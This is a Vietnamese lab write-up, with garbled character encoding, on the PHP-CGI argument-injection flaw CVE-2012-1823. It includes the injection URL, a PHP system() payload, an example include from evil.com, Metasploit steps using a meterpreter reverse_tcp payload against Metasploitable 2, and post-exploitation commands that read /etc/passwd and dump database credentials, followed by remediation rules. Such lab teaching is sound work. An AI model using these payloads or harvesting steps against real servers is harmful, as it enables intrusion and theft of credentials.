# üõ°Ô∏è Remote Code Execution th√¥ng qua PHP-CGI Argument Injection

‚ö†Ô∏è L∆∞u √Ω: C√°c b∆∞·ªõc khai th√°c ch·ªâ n√™n th·ª≠ nghi·ªám tr√™n m√¥i tr∆∞·ªùng lab, tuy·ªát ƒë·ªëi kh√¥ng s·ª≠ d·ª•ng tr√™n h·ªá th·ªëng s·∫£n xu·∫•t!
> - **T√™n l·ªó h·ªèng:** PHP CGI Argument Injection
> - **M√£ CVE:** CVE-2012-1823
> - **M·ª©c ƒë·ªô:** Cao
> - **Ng√†y ph√°t hi·ªán:** th√°ng 5 nƒÉm 2012

## üß± 1. M√¥ t·∫£ l·ªó h·ªïng
- **"L·ªñI N√ÄY X·∫¢Y RA V√å:"**
> - "PHP phi√™n b·∫£n c≈© (‚â§ 5.3.12 ho·∫∑c 5.4.2)"
> -  "V√† PHP d∆∞·ªõi ch·∫ø ƒë·ªô CGI (Common Gateway Interface)"
> -  "PHP ph√¢n t√≠ch sai tham s·ªë truy·ªÅn t·ª´ URL, cho ph√©p attacker ch√®n l·ªánh nguy hi·ªÉm"
‚òëÔ∏è K·∫ª t·∫•n c√¥ng th·ª±c thi l·ªánh t√πy √Ω t·ª´ xa (RCE ‚Äì Remote Code Execution) th√¥ng qua ƒë·ªëi s·ªë d√≤ng l·ªánh (argument injection).

## Hacker ƒë√£ l·ª£i d·ª•ng g√¨?
- Hacker l·ª£i d·ª•ng PHP-CGI hi·ªÉu nh·∫ßm query string (?-d ...) l√† ƒë·ªëi s·ªë d√≤ng l·ªánh, t·ª´ ƒë√≥ √©p PHP n·∫°p v√† th·ª±c thi m√£ do hacker g·ª≠i.

## K·ªπ thu·∫≠t khai th√°c:
- G·ª≠i m·ªôt HTTP request c√≥ ? ch·ª©a argument b·∫•t h·ª£p l·ªá v√†o php-cgi
- Truy·ªÅn m√£ PHP ƒë·ªôc h·∫°i th√¥ng qua POST
- K·∫øt qu·∫£: shell ƒë∆∞·ª£c th·ª±c thi t·ª´ xa

### G·ª≠i m·ªôt HTTP request c√≥ ? ch·ª©a argument b·∫•t h·ª£p l·ªá v√†o php-cgi

- N·∫øu m√°y ch·ªß s·ª≠ d·ª•ng php-cgi m√† kh√¥ng b·∫≠t t√πy ch·ªçn an to√†n (--no-header, --force-cgi-redirect) ho·∫∑c kh√¥ng c·∫•u h√¨nh ƒë√∫ng, th√¨ attacker c√≥ th·ªÉ:

- ‚û° Th√™m t√πy ch·ªçn d√≤ng l·ªánh cho PHP ngay trong URL nh∆∞:
```
http://victim.com/index.php?-d+allow_url_include=on+-d+auto_prepend_file=php://input
```
- ·ªû ƒë√¢y, -d l√† tham s·ªë PHP ƒë·ªÉ ch·ªânh c·∫•u h√¨nh t·∫°i runtime.
- ‚úÖ V√¨ tr√¨nh th√¥ng d·ªãch php-cgi kh√¥ng ph√¢n bi·ªát tham s·ªë th·∫≠t v√† gi·∫£ ‚Äî n√≥ t∆∞·ªüng -d l√† c·∫•u h√¨nh b√¨nh th∆∞·ªùng do admin ƒë∆∞a v√†o.

```
-d allow_url_include=on  
-d auto_prepend_file=php://input
```

#### üß† 1. -d allow_url_include=on

- üìå Nghƒ©a l√†:
> Cho ph√©p PHP include file qua URL, v√≠ d·ª• nh∆∞:

```
include("http://evil.com/shell.txt");
```

‚ö†Ô∏è M·∫∑c ƒë·ªãnh, allow_url_include b·ªã t·∫Øt (off) v√¨ c·ª±c k·ª≥ nguy hi·ªÉm ‚Äì k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ t·∫£i m√£ ƒë·ªôc t·ª´ internet v√†o m√°y ch·ªß.

#### üß† 2. -d auto_prepend_file=php://input

- üìå Nghƒ©a l√†:

> Tr∆∞·ªõc khi th·ª±c thi script ch√≠nh (index.php), PHP s·∫Ω ch·∫°y n·ªôi dung t·ª´ php://input.

#### üßæ Gi·∫£i th√≠ch php://input
- php://input l√† m·ªôt stream trong PHP cho ph√©p truy c·∫≠p raw data t·ª´ body c·ªßa HTTP request (th∆∞·ªùng d√πng trong POST).

- Hacker s·∫Ω g·ª≠i m√£ PHP ƒë·ªôc trong ph·∫ßn body, v√≠ d·ª•:

```
POST /index.php?... HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

<?php system($_GET['cmd']); ?>
```







## ‚öíÔ∏è 2. Th·ª≠ nghi·ªám th·ª±c t·∫ø
- **Topology**

<img width="634" height="210" alt="image" src="https://github.com/user-attachments/assets/99335dfc-2aa0-4397-b75e-72c27fb406c1" />

- QUY√âT M√ÅY CH·ª¶ ƒë·ªÉ t√¨m th√¥ng tin v·ªÅ phi√™n b·∫£n web server:

<img width="704" height="259" alt="image" src="https://github.com/user-attachments/assets/d9664fec-59cf-4cb9-8c63-3083583190b1" />

### Sau khi x√°c minh ƒë∆∞·ª£c phi√™n b·∫£n PHP tr√™n web server l√† 5.4.2. T√¨m ki·∫øm c√°c l·ªó h·ªïng b·∫£o m·∫≠t c√≥ li√™n quan:
```
sudo msfconsole
```

```
search php_cgi
```

### S·ª≠ d·ª•ng module php_cgi_arg_injection c·ªßa Metataploit ƒë·ªÉ chi·∫øm shell tr√™n Metasploitable
```
use multi/http/php_cgi_arg_injection
```

### XEM SETTING
```
show options
```

```
set rhost <IP Metasploitable 2>
```

```
# set lhost
# set lport
```

```
set PAYLOAD php/meterpreter/reverse_tcp
```

```
exploit
```

```
shell
```

### ‚öîÔ∏è 1. Ki·ªÉm tra th√¥ng tin h·ªá th·ªëng
```
uname -a          # Th√¥ng tin kernel
id                # Ki·ªÉm tra UID, GID
```

### üîç 2. Ki·ªÉm tra c√°c user tr√™n h·ªá th·ªëng
```
cat /etc/passwd
```
- L√† danh s√°ch to√†n b·ªô ng∆∞·ªùi d√πng c√≥ tr√™n h·ªá th·ªëng Linux

### üìÅ 4. Kh√°m ph√° th∆∞ m·ª•c home, c√≥ th·ªÉ ch·ª©a th√¥ng tin nh·∫°y c·∫£m [*]
```
cd /home
ls -la
```

#### üîç Xem n·ªôi dung c√°c th∆∞ m·ª•c /home
```
ls -la /home/msfadmin
ls -la /home/user
ls -la /home/service
```

- ‚úÖ Hi·ªÉn th·ªã chi ti·∫øt t·∫•t c·∫£ th∆∞ m·ª•c ng∆∞·ªùi d√πng trong /home

### üîë 5. T√¨m ki·∫øm th√¥ng tin nh·∫°y c·∫£m: m·∫≠t kh·∫©u, private key, c·∫•u h√¨nh database
```
find /var/www -type f -iname "*config*.php"
```

#### üîç ƒê·∫∑c bi·ªát ch√∫ √Ω c√°c file trong dvwa, mutillidae, phpMyAdmin, tikiwiki: [*]
```
cat /var/www/dvwa/config/config.inc.php
```

<img width="950" height="441" alt="image" src="https://github.com/user-attachments/assets/c4b0795d-7993-4b1a-9906-8b4096b8592f" />

### üîÑ 7. N·∫øu c√≥ th√¥ng tin ƒëƒÉng nh·∫≠p MySQL, th·ª≠ ƒëƒÉng nh·∫≠p: [*]
```
mysql -u root -p
```

```
show databases;
```

```
exit
```

```
USE dvwa;
SHOW TABLES;
SELECT * FROM users;
```

```
exit
```


### üß± 8. Ki·ªÉm tra c√°c ti·∫øn tr√¨nh ƒëang ch·∫°y, d·ªãch v·ª• kh·∫£ nghi
```
ps aux
```


#### TH·ª∞C HI·ªÜN CH√çM SHELL
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
su users
```

ho·∫∑c
```
su msfadmin
# m·∫≠t kh·∫©u: msfadmin ho·∫∑c password
```

## üìâ 3. R·ªßi ro an ninh

| K·∫øt qu·∫£                                               | Di·ªÖn gi·∫£i                                                              |
| ----------------------------------------------------- | ---------------------------------------------------------------------- |
| üß† Th·ª±c thi l·ªánh t·ª´ xa (RCE)                          | Hacker ch·∫°y ƒë∆∞·ª£c l·ªánh h·ªá th·ªëng nh∆∞ `id`, `uname`, `cat /etc/passwd`    |
| üêö Nh·∫≠n ƒë∆∞·ª£c **web shell**                            | Hacker ch√®n reverse shell, m·ªü k·∫øt n·ªëi t·ª´ m√°y n·∫°n nh√¢n v·ªÅ               |
| üì• T·∫£i malware, c√†i backdoor                          | Hacker chi·∫øm quy·ªÅn m√°y ch·ªß, b√≠ m·∫≠t t·∫£i m√£ ƒë·ªôc v·ªÅ                       |
| üïµÔ∏è Truy c·∫≠p database, file, c√°c h·ªá th·ªëng n·ªôi b·ªô kh√°c | Do `www-data` th∆∞·ªùng c√≥ quy·ªÅn ƒë·ªçc m√£ ngu·ªìn web, file c·∫•u h√¨nh database |

## üõ°Ô∏è 4. ƒê·ªÅ xu·∫•t kh·∫Øc ph·ª•c

| H√†nh ƒë·ªông               | Chi ti·∫øt                                                      |
| ----------------------- | ------------------------------------------------------------- |
| üîÑ **C·∫≠p nh·∫≠t PHP**     | N√¢ng c·∫•p PHP l√™n √≠t nh·∫•t phi√™n b·∫£n **7.4 tr·ªü l√™n**            |
| üîê **T·∫Øt PHP-CGI**      | N·∫øu kh√¥ng b·∫Øt bu·ªôc d√πng CGI, t·∫Øt ho√†n to√†n module             |
| üöß **C·∫•u h√¨nh WAF/IDS** | Tri·ªÉn khai WAF (ModSecurity, v.v...) ƒë·ªÉ l·ªçc tham s·ªë nguy hi·ªÉm |
| üßπ **Qu·∫£n l√Ω b·∫£n v√°**   | Thi·∫øt l·∫≠p l·ªãch c·∫≠p nh·∫≠t ph·∫ßn m·ªÅm ƒë·ªãnh k·ª≥                      |

### L·ªçc Tham S·ªë Nguy Hi·ªÉm

> - `-d`, `-n`, `-s`...

```
cd /var/www
sudo nano .htaccess
```

- D√°n n·ªôi dung sau:

```
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]
  RewriteRule ^.* - [F,L]
</IfModule>
```

- üîç Ki·ªÉm tra nhanh

```
cat /etc/apache2/mods-enabled/
```

```
ls /etc/apache2/mods-enabled/rewrite.load
```

- reload

```
sudo a2enmod rewrite
sudo /etc/init.d/apache2 force-reload
```

- üõ† Cho ph√©p Apache s·ª≠ d·ª•ng .htaccess

```
sudo nano /etc/apache2/sites-available/default
```

- T√¨m 

```
<Directory /var/www/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride None
    Order allow,deny
    allow from all
</Directory>
```

- ‚û° S·ª≠a d√≤ng AllowOverride None th√†nh:

```
AllowOverride All
```

- üîÅ Kh·ªüi ƒë·ªông l·∫°i Apache

```
sudo /etc/init.d/apache2 restart
```
### C·∫≠p nh·∫≠t PHP
- ∆Øu ti√™n kh·∫Øc ph·ª•c

## Tham Kh·∫£o

- https://github.com/0xl0k1/CVE-2012-1823
- [CVE-2012-1823 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2012-1823)

## ‚úÖ K·∫øt Lu·∫≠n
## NOTEs

- **metaploit2**

| Tr∆∞·ªùng       | Gi√° tr·ªã    |
| ------------ | ---------- |
| **Username** | `msfadmin` |
| **Password** | `msfadmin` |

```
sudo ifconfig eth0 192.168.80.10 netmask 255.255.255.0 up 
```

- SSH ƒë·∫øn metaploit2

```
export TERM=xterm
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.80.10
```
### So S√°nh 

| Ti√™u ch√≠                   | mod\_php       | php-cgi                              | php-fpm (FastCGI)        |
| -------------------------- | -------------- | ------------------------------------ | ------------------------ |
| T√≠ch h·ª£p v·ªõi web server    | G·∫Øn v√†o Apache | Ch·∫°y b√™n ngo√†i                       | Ch·∫°y n·ªÅn, k·∫øt n·ªëi socket |
| Hi·ªáu su·∫•t                  | Trung b√¨nh‚Äìcao | **Th·∫•p** (v√¨ t·∫°o ti·∫øn tr√¨nh m·ªói l·∫ßn) | **Cao**                  |
| Qu·∫£n l√Ω ti·∫øn tr√¨nh         | Apache lo      | T·ª± t·∫°o m·ªói l·∫ßn                       | C√≥ s·∫µn pool ti·∫øn tr√¨nh   |
| ƒêa phi√™n b·∫£n PHP           | Kh√≥            | C√≥ th·ªÉ                               | ‚úÖ D·ªÖ                     |
| D·ªÖ c·∫•u h√¨nh                | ‚úÖ R·∫•t d·ªÖ       | Trung b√¨nh                           | Kh√≥ h∆°n ch√∫t             |
| D·ªÖ b·ªã l·ªói n·∫øu sai c·∫•u h√¨nh | Th·∫•p           | **Cao** (v√≠ d·ª• CVE-2012-1823)        | Th·∫•p                     |
| Ph·ªï bi·∫øn hi·ªán nay          | √çt d·∫ßn         | **G·∫ßn nh∆∞ l·ªói th·ªùi**                 | ‚úÖ **Ph·ªï bi·∫øn nh·∫•t**      |


## üß≠ S∆° ƒë·ªì lu·ªìng khai th√°c CVE-2012-1823
```
[ Hacker ]
   |
   | 1. G·ª≠i HTTP request ƒë·∫∑c bi·ªát:
   |    GET /index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input
   |    POST body: <?php system('id'); ?>
   |
   v
[ Web Server (Apache ho·∫∑c Nginx)]
   |
   | 2. Web server chuy·ªÉn y√™u c·∫ßu t·ªõi PHP-CGI (v√≠ d·ª•: /usr/bin/php-cgi)
   |    L∆∞u √Ω: c√°c tham s·ªë `-d` b·ªã chuy·ªÉn nguy√™n v·∫πn
   |
   v
[ PHP-CGI ]
   |
   | 3. Nh·∫≠n tham s·ªë c·∫•u h√¨nh ƒë·ªông:
   |    - Cho ph√©p `allow_url_include = On`
   |    - Ch√®n m√£ t·ª´ `php://input` nh·ªù `auto_prepend_file`
   |
   v
[ PHP Engine ]
   |
   | 4. ƒê·ªçc n·ªôi dung t·ª´ POST body:
   |    <?php system('id'); ?>
   |
   | ‚Üí Th·ª±c thi m√£ PHP do hacker g·ª≠i
   |
   v
[ K·∫øt qu·∫£ ]
   ‚Üí Hacker th·ª±c thi l·ªánh t√πy √Ω tr√™n m√°y ch·ªß
   ‚Üí Chi·∫øm quy·ªÅn truy c·∫≠p, ƒë·ªçc file, chi·∫øm shell...

```
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  Hacker    ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∂ Web Server (Apache)‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ PHP-CGI B·ªã   ‚îÇ
‚îÇ            ‚îÇ HTTP  ‚îÇ ch·∫°y PHP d∆∞·ªõi CGI ‚îÇ       ‚îÇ L·ªñI PH√ÇN T√çCH‚îÇ
‚îÇ G·ª≠i y√™u c·∫ßu‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∂ (index.php? -d ...)‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ QUERY STRING ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
     ‚îÇ                                                 ‚îÇ
     ‚îÇ   POST body:                                    ‚îÇ
     ‚îÇ   <?php system("id"); ?>                        ‚îÇ
     ‚îÇ                                                 ‚ñº
     ‚îÇ                                    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
     ‚îÇ                                    ‚îÇ PHP hi·ªÉu:                 ‚îÇ
     ‚îÇ                                    ‚îÇ -d auto_prepend_file=... ‚îÇ
     ‚îÇ                                    ‚îÇ ‚Üí ƒê·ªçc m√£ t·ª´ php://input  ‚îÇ
     ‚îÇ                                    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
     ‚îÇ                                               ‚îÇ
     ‚ñº                                               ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                 ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  PHP th·ª±c thi m√£     ‚îÇ‚óÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ    ƒêo·∫°n m√£ ƒë·ªôc g·ª≠i b·ªüi     ‚îÇ
‚îÇ  system("id");       ‚îÇ                 ‚îÇ    hacker ƒë∆∞·ª£c th·ª±c thi    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                 ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
             ‚îÇ
             ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  Hacker nh·∫≠n k·∫øt qu·∫£ tr·∫£ v·ªÅ‚îÇ
‚îÇ  (v√≠ d·ª•: www-data, id, ...)‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```
